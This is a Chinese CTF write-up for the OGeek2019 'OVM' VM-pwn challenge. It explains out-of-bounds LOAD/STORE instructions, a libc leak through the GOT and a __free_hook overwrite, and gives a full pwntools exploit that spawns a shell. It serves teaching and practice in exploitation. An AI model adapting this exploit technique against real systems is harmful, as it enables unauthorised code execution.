---
title: OGeek2019-Final OVM WP
tags:
  - pwn
  - CTF
  - 题解
  - VM Pwn
  - OGeek2019
categories:
  - - pwn
    - CTF题解
    - VM Pwn
date: 2026-06-25 15:28:08
cover:
banner:
---

# OGeek2019-Final OVM WP

> **题目名称：** OVM
> **题目来源：** OGeek2019
> **题目靶场：** [CTF2](https://ctf2.dasctf.com)

## 思路

```
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```

一个还算简单的 VM PWN

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  unsigned __int16 v4; // [rsp+2h] [rbp-Eh] BYREF
  unsigned __int16 pc; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int16 v6; // [rsp+6h] [rbp-Ah] BYREF
  int opcode; // [rsp+8h] [rbp-8h]
  int i; // [rsp+Ch] [rbp-4h]

  comment = malloc(0x8Cu);
  setbuf(stdin, nullptr);
  setbuf(stdout, nullptr);
  setbuf(stderr, nullptr);
  signal(2, signal_handler);
  write(1, "WELCOME TO OVM PWN\n", 0x16u);
  write(1, "PC: ", 4u);
  _isoc99_scanf("%hd", &pc);
  getchar();
  write(1, "SP: ", 4u);
  _isoc99_scanf("%hd", &v6);
  getchar();
  unk_242094 = v6;
  g_count = pc;
  write(1, "CODE SIZE: ", 0xBu);
  _isoc99_scanf("%hd", &v4);
  getchar();
  if ( v6 + (unsigned int)v4 > 0x10000 || !v4 )
  {
    write(1, "EXCEPTION\n", 0xAu);
    exit(155);
  }
  write(1, "CODE: ", 6u);
  running = 1;
  for ( i = 0; v4 > i; ++i )
  {
    _isoc99_scanf("%d", &memory[pc + i]);
    if ( (memory[i + pc] & 0xFF000000) == 0xFF000000 )
      memory[i + pc] = 0xE0000000;
    getchar();
  }
  while ( running )
  {
    opcode = fetch();
    execute(opcode);
  }
  write(1, "HOW DO YOU FEEL AT OVM?\n", 0x1Bu);
  read(0, comment, 0x8Cu);
  sendcomment(comment);
  write(1, "Bye\n", 4u);
  return 0;
}
```

`main` 函数非常直接，让我我们输入 PC、SP、CODE SIZE 还有 CODE 序列。需要注意的是：

```c
  for ( i = 0; v4 > i; ++i )
  {
    _isoc99_scanf("%d", &memory[pc + i]);
    if ( (memory[i + pc] & 0xFF000000) == 0xFF000000 )
      memory[i + pc] = 0xE0000000;
    getchar();
  }
```

这些代码会将操作码 `0xFF` 强行转化为 `0xE0` 也就是该虚拟机中的退出码

然后就是虚拟机的主循环

```c
  while ( running )
  {
    opcode = fetch();
    execute(opcode);
  }
```

`fetch()` 会不断从全局数组 `memory` 中取出下一条指令并交给 `execute()` 执行。

最后有一个 “用户反馈”，读取我们的输入放到一个分配好的 chunk 中，这个 chunk 的指针存放在全局变量 `comment` 中，其与 `memory` 相邻。

该虚拟机的指令列表如下：

| 操作码 | 助记符 | 行为                                        |
| :----- | :----- | :------------------------------------------ |
| 0x10   | LOADI  | reg[v4] = imm（立即数载入）                 |
| 0x20   | SETZ   | reg[v4] = (imm == 0)                        |
| 0x30   | LOAD   | reg[v4] = memory[reg[v2]] ★                 |
| 0x40   | STORE  | memory[reg[v2]] = reg[v4] ★                 |
| 0x50   | PUSH   | stack[SP++] = reg[v4]                       |
| 0x60   | POP    | reg[v4] = stack[--SP]                       |
| 0x70   | ADD    | reg[v4] = reg[v2] + reg[v3]                 |
| 0x80   | SUB    | reg[v4] = reg[v3] - reg[v2]                 |
| 0x90   | AND    | reg[v4] = reg[v2] & reg[v3]                 |
| 0xA0   | OR     | reg[v4] = reg[v2] \| reg[v3]                |
| 0xB0   | XOR    | reg[v4] = reg[v2] ^ reg[v3]                 |
| 0xC0   | SHL    | reg[v4] = reg[v3] << reg[v2]                |
| 0xD0   | SHR    | reg[v4] = reg[v3] >> reg[v2]                |
| 0xE0   | EXIT   | running = 0（输出 "EXIT"）                  |
| 0xFF   | HALT   | 用 printf("R%d: %X") 打印全部寄存器后停机 ★ |

漏洞主要出在 `LOAD` 和 `STORE` 这两个指令上，其存在数组越界，让我们可以访问 `memory` 以外的内存。所以说我们可以控制 `comment` 中存放的 chunk 指针，将其指向我们需要的地方。由于题目环境为 glibc 2.23 且在 `sendcomment()` 函数中存在释放操作：

```c
void __fastcall sendcomment(void *a1)
{
  free(a1);
}
```

所以这里还是使用常规的劫持 `__free_hook` 的方法 

### 攻击思路

将 `opcode` 封装为如下函数

```python
def loadi(v4, v2):
    return u32((p8(0x10) + p8(v4) + p8(0) + p8(v2))[::-1])

def setz(v4):
    return u32((p8(0x20) + p8(v4) + p8(0) + p8(0))[::-1])

# reg[v4] = memory[reg[v2]];
def load(v4, v2):
    return u32((p8(0x30) + p8(v4) + p8(0) + p8(v2))[::-1])

def store(v4, v2):
    # memory[reg[v2]] = reg[v4]
    return u32((p8(0x40) + p8(v4) + p8(0) + p8(v2))[::-1])

def push(v4):
    return u32((p8(0x50) + p8(v4) + p8(0) + p8(0))[::-1])

def pop(v4):
    return u32((p8(0x60) + p8(v4) + p8(0) + p8(0))[::-1])

# reg[v4] = reg[v2] + reg[v3];
def add(v4, v3, v2):
    return u32((p8(0x70) + p8(v4) + p8(v3) +p8(v2))[::-1])

# reg[v4] = reg[v3] - reg[v2];
def sub(v4, v3, v2):
    return u32((p8(0x80) + p8(v4) + p8(v3) + p8(v2))[::-1])

# reg[v4] = reg[v2] & reg[v3];
def AND(v4, v3, v2):
    return u32((p8(0x90) + p8(v4) + p8(v3) + p8(v2))[::-1])

# reg[v4] = reg[v2] | reg[v3];
def OR(v4, v3, v2):
    return u32((p8(0xA0) + p8(v4) + p8(v3) + p8(v2))[::-1])

# reg[v4] = reg[v2] ^ reg[v3];
def XOR(v4, v3, v2):
    return u32((p8(0xB0) + p8(v4) + p8(v3) + p8(v2))[::-1])

# reg[v4] = reg[v3] << reg[v2];
def shl(v4, v3, v2):
    return u32((p8(0xC0) + p8(v4) + p8(v3) + p8(v2))[::-1])

def shr(v4, v3, v2):
    return u32((p8(0xC0) + p8(v4) + p8(v3) + p32(v2))[::-1])
```

首先泄露 libc 地址。`memory` 在 bss 段内，在网上一点就是 got 表。们通过越界读将got表中的libc地址读取到寄存器中，这里需要注意的是，由于寄存器是双字，也就是四字节的，而地址是八字节的，所以我们需要两个寄存器才能存储一个地址。

got表中最后一个是stderr，不过不选它来泄露，因为stderr地址的最后两位是00，在这里我们选择stdin来泄露,因为后续我们需要通过stdin的地址来计算得到__free_hook-8,因此尽量选择与free_hook地址相差较小的来泄露,能够减小计算量。

`memory` 距离 stdin 的距离是 -56。转化为十六进制是 0xffffffc8 我们可以通过 shl 和 add 来构造

```python
 		loadi(0, 8),
        #reg[0] = 8
        loadi(1, 0xff),
        # reg[1] = 0xff
        loadi(2, 0xff),
        # reg[2] = 0xff
        shl(2, 2, 0),
        # reg[2] = 0xff00
        add(2, 2, 1),
        # reg[2] = 0xffff
        shl(2, 2, 0),
        # reg[2] = 0xffff00
        add(2, 2, 1),
        # reg[2] = 0xffffff
        shl(2, 2, 0),
        # reg[2] = 0xffffff00
        loadi(1, 0xc8),
        add(2, 2, 1),
        # reg[2] = 0xffffffc8 => -56
        load(3, 2),
        # reg[3] = stdin low 32 bits
        loadi(1, 1),
        add(2, 2, 1),
        # reg[2] = -55
        load(4, 2),
        # reg[4] = stdin high 32 bits
```

这样我们就将 stdin 的地址读取到了虚拟机的寄存器中。然后我们计算出 __free_hook - 8 和 stdin 的偏移然后将其 add 到之前的寄存器上

```python
		loadi(1, 0x10),
        shl(1, 1, 0),
        # reg[1] = 0x1000
        loadi(0, 0x90),
        add(1, 1, 0),
        # reg[1] = 0x1090
        add(3, 3, 1),
        # reg[3] + reg[4] = __free_hook - 8
```

然后我们需要将 __free_hook - 8 的地址放到 `comment[0]` 中

```python 
		loadi(1, 47),
        add(2, 2 , 1),
        # reg[2] = -8
        store(3, 2),
        loadi(1, 1),
        add(2, 2, 1),
        store(4, 2),
        u32((p8(0xff) + p8(0) +p8(0) +p8(0))[::-1]) # exit
```

最后退出。

但是有一点需要注意，我们最后输入的退出操作码是 `0xFF` 其会被强制转换为 `0xE0`。其详细的逻辑如下：

```c
		if ( HIBYTE(opcode) == 0xE0 )
        {
          running = 0;
          if ( !unk_242094 )
            return write(1, "EXIT\n", 5u);
        }

        else if ( HIBYTE(opcode) != 0xFF )
        {
          return result;
        }
        running = 0;
        for ( i = 0; i <= 15; ++i )
          printf("R%d: %X\n", i, reg[i]);
        return write(1, "HALT\n", 5u);
```

这里的 `unk_242094` 存放的是 `main` 函数读取的 SP 的数值，我们需要让这个值在退出时等于 1。才能让虚拟机打印出所有寄存器的值。否则虚拟机会直接退出。

## EXP

```python
#!/bin/python
# _*_ coding: utf-8 _*_

from pwn import *

context(arch = 'amd64', os = 'linux')
context.terminal = ['konsole', '-e']
context.log_level = 'debug'
context.binary = './ovm'
e = ELF('./ovm')
# libc = e.libc
libc = ELF('./libc6_2.23-0ubuntu10_amd64.so')
host = "127.0.0.1"
post = 9999
if args['RE']:
    io = remote("ddb1a6d484b1686eeb3bbf5f.tcp-ctf2.dasctf.com", 9999, ssl=True)
else:
    io = process('./ovm')

def debug():
    gdb.attach(io)
    pause()

# ===== lambda =====
sa  = lambda s, d: io.sendafter(s, d)       # send after
sla = lambda s, d: io.sendlineafter(s, d)   # sendline after  
sl  = lambda d:    io.sendline(d)           # sendline
sd  = lambda d:    io.send(d)               # send
ru  = lambda s:    io.recvuntil(s)          # recvuntil
rc  = lambda n:    io.recv(n)               # recv n bytes
rl  = lambda :     io.recvline()            # recvline
ti  = lambda :     io.interactive()         # interactive
lg  = lambda s, v:    log.info('\033[1;32m %s --> 0x%x \033[0m' % (s, v))

def loadi(v4, v2):
    return u32((p8(0x10) + p8(v4) + p8(0) + p8(v2))[::-1])

def setz(v4):
    return u32((p8(0x20) + p8(v4) + p8(0) + p8(0))[::-1])

# reg[v4] = memory[reg[v2]];
def load(v4, v2):
    return u32((p8(0x30) + p8(v4) + p8(0) + p8(v2))[::-1])

def store(v4, v2):
    # memory[reg[v2]] = reg[v4]
    return u32((p8(0x40) + p8(v4) + p8(0) + p8(v2))[::-1])

def push(v4):
    return u32((p8(0x50) + p8(v4) + p8(0) + p8(0))[::-1])

def pop(v4):
    return u32((p8(0x60) + p8(v4) + p8(0) + p8(0))[::-1])

# reg[v4] = reg[v2] + reg[v3];
def add(v4, v3, v2):
    return u32((p8(0x70) + p8(v4) + p8(v3) +p8(v2))[::-1])

# reg[v4] = reg[v3] - reg[v2];
def sub(v4, v3, v2):
    return u32((p8(0x80) + p8(v4) + p8(v3) + p8(v2))[::-1])

# reg[v4] = reg[v2] & reg[v3];
def AND(v4, v3, v2):
    return u32((p8(0x90) + p8(v4) + p8(v3) + p8(v2))[::-1])

# reg[v4] = reg[v2] | reg[v3];
def OR(v4, v3, v2):
    return u32((p8(0xA0) + p8(v4) + p8(v3) + p8(v2))[::-1])

# reg[v4] = reg[v2] ^ reg[v3];
def XOR(v4, v3, v2):
    return u32((p8(0xB0) + p8(v4) + p8(v3) + p8(v2))[::-1])

# reg[v4] = reg[v3] << reg[v2];
def shl(v4, v3, v2):
    return u32((p8(0xC0) + p8(v4) + p8(v3) + p8(v2))[::-1])

def shr(v4, v3, v2):
    return u32((p8(0xC0) + p8(v4) + p8(v3) + p32(v2))[::-1])

# ===== main =====
def main():
    codes = [
        loadi(0, 8),
        #reg[0] = 8
        loadi(1, 0xff),
        # reg[1] = 0xff
        loadi(2, 0xff),
        # reg[2] = 0xff
        shl(2, 2, 0),
        # reg[2] = 0xff00
        add(2, 2, 1),
        # reg[2] = 0xffff
        shl(2, 2, 0),
        # reg[2] = 0xffff00
        add(2, 2, 1),
        # reg[2] = 0xffffff
        shl(2, 2, 0),
        # reg[2] = 0xffffff00
        loadi(1, 0xc8),
        add(2, 2, 1),
        # reg[2] = 0xffffffc8 => -56
        load(3, 2),
        # reg[3] = stdin low 32 bits
        loadi(1, 1),
        add(2, 2, 1),
        # reg[2] = -55
        load(4, 2),
        # reg[4] = stdin high 32 bits
        loadi(1, 0x10),
        shl(1, 1, 0),
        # reg[1] = 0x1000
        loadi(0, 0x90),
        add(1, 1, 0),
        # reg[1] = 0x1090
        add(3, 3, 1),
        # reg[3] + reg[4] = __free_hook - 8
        loadi(1, 47),
        add(2, 2 , 1),
        # reg[2] = -8
        store(3, 2),
        loadi(1, 1),
        add(2, 2, 1),
        store(4, 2),
        u32((p8(0xff) + p8(0) +p8(0) +p8(0))[::-1]) # exit
    ]

    sla(b"PC: ", "0")
    sla(b"SP: ", "1")
    sla(b"CODE SIZE: ", str(len(codes)))
    ru(b"CODE: ")
    for code in codes:
        sl(str(code))

    ru(b"R3: ")
    low = int(rc(8), 16) + 8
    lg("low: ", low)
    ru(b"R4: ")
    high = int(rc(4), 16)
    lg("high", high)

    free_hook = (high << 32) + low
    lg("free_hook", free_hook)
    libc_base = free_hook - libc.sym['__free_hook']
    lg("libc_base", libc_base)
    system_addr = libc_base + libc.sym['system']
    ru(b"OVM?\n")
    sl(b'/bin/sh\x00' + p64(system_addr))

# ===== exec =====
if __name__ == '__main__':
    main() 
    ti()
```
